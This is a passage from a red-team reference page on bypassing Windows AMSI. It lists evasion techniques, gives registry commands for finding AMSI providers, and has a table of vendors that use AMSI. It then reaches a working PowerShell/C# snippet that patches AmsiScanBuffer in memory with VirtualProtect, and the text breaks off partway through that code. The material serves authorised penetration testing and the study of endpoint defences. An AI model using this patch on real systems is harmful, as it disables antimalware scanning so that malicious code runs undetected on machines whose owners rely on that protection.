# Windows - AMSI Bypass - Internal All The Things
URL: https://swisskyrepo.github.io/InternalAllTheThings/redteam/evasion/windows-amsi-bypass/

Windows - AMSI Bypass - Internal All The Things

## Summary

- List AMSI Providers
- Which Endpoint Protection is Using AMSI
- Patching amsi.dll AmsiScanBuffer by rasta-mouse
- Dont use net webclient
- Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass
- Forcing an error
- Disable Script Logging
- Amsi Buffer Patch - In memory
- Same as 6 but integer Bytes instead of Base64
- Using Matt Graeber's Reflection method
- Using Matt Graeber's Reflection method with WMF5 autologging bypass
- Using Matt Graeber's second Reflection method
- Using Cornelis de Plaa's DLL hijack method
- Use Powershell Version 2 - No AMSI Support there
- Nishang all in one
- Adam Chesters Patch
- AMSI.fail

## List AMSI Providers

- List providers with : `Get-ChildItem -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\'`
- Find software from CLSID

```
Get-ChildItem -Path 'HKLM:\SOFTWARE\Classes\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}'
Name                           Property
----                           --------
Hosts                          (default) : Scanned Hosting Applications
InprocServer32                 (default) : "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2210.4-0\MpOav.dll"

```

## Which Endpoint Protection is Using AMSI

Small extract from subat0mik/whoamsi - An effort to track security vendors' use of Microsoft's Antimalware Scan Interface:

| Vendor/Product | AMSI | Date | Reference |
| --- | --- | --- | --- |
| Avast | Y | 03/20/2016 | https://forum.avast.com/index.php?topic=184491.msg1300884#msg1300884 |
| AVG | Y | 03/08/2016 | https://support.avg.com/answers?id=906b00000008oUTAAY |
| BitDefender Consumer | Y | 09/20/2016 | https://forum.bitdefender.com/index.php?/topic/72455-antimalware-scan-service/ |
| BitDefender Enterprise | Y | 05/25/2021 | https://twitter.com/Bitdefender_Ent/status/1397187195669295111?s=20 |
| Kaspersky Anti Targeted Attack Platform | Y | 10/10/2018 | https://help.kaspersky.com/KIS/2019/en-US/119653.htm |
| Symantec Advanced Threat Protection | Y | 07/15/2020 | https://techdocs.broadcom.com/content/broadcom/techdocs/us/en/symantec-security-software/endpoint-security-and-management/endpoint-protection/all/release-notes/Whats-new-for-Symantec-Endpoint-Protection-14_3-.html |
| Microsoft Defender for Endpoint | Y | 06/09/2015 | https://www.microsoft.com/security/blog/2015/06/09/windows-10-to-offer-application-developers-new-malware-defenses/ |

## Patching amsi.dll AmsiScanBuffer by rasta-mouse

```
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am"